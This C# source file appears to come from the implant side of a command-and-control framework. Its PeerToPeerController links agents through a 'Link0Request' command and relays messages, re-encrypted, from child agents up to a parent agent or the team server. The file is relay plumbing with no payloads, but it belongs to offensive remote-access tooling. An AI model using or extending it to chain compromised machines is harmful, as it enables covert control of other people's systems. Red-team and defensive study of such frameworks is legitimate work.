using Agent.Interfaces;

using Shared.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Controllers
{
    public class PeerToPeerController
    {
        AgentController Agent;

        Dictionary<string, ICommModule> ConnectedAgents = new Dictionary<string, ICommModule>();

        public PeerToPeerController(AgentController Agent)
        {
            this.Agent = Agent;
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (true)
                {
                    foreach (var module in ConnectedAgents.Values.ToArray())
                    {
                        if (module.RecvData(out AgentMessage Message))
                        {
                            if (Message != null)
                            {
                                // These messages come from connected P2P Agents.
                                // We either need to re-encrypt the message and forward it on to the TS
                                //    or pass it to ourselves (e.g. if it's part of the link process).

                                if (Message.AgentID.Equals(Agent.AgentID))
                                {
                                    Agent.HandleAgentMessage(Message);
                                }
                                else
                                {
                                    var encrypted = Agent.Crypto.Encrypt(Message, out byte[] iv);
                                    
                                    var message = new AgentMessage
                                    {
                                        Data = encrypted,
                                        IV = iv
                                    };

                                    if (string.IsNullOrEmpty(Agent.ParentAgentID))
                                    {
                                        message.AgentID = Message.AgentID;
                                    }
                                    else
                                    {
                                        message.AgentID = Agent.ParentAgentID;
                                    }

                                    Agent.SendMessage(message);
                                }
                            }
                        }
                    }

                    Thread.Sleep(1000);
                }
            });
        }

        public void LinkAgent(ICommModule CommModule)
        {
            var placeholder = Shared.Utilities.Utilities.GetRandomString(6);
            ConnectedAgents.Add(placeholder, CommModule);

            var c2Data = Shared.Utilities.Utilities.SerialiseData(new C2Data
            {
                Module = "Core",
                Command = "Link0Request",
                Data = Encoding.UTF8.GetBytes(string.Concat(placeholder, Agent.AgentID))
        });

            CommModule.SendData(new AgentMessage
            {
                Data = c2Data
            });

            CommModule.Start();
        }

        public void UpdatePlaceholder(string Placeholder, string AgentID)
        {
            if (ConnectedAgents.ContainsKey(Placeholder))
            {
                var commModule = ConnectedAgents[Placeholder];
                ConnectedAgents.Remove(Placeholder);
                ConnectedAgents.Add(AgentID, commModule);
            }
        }
    }
}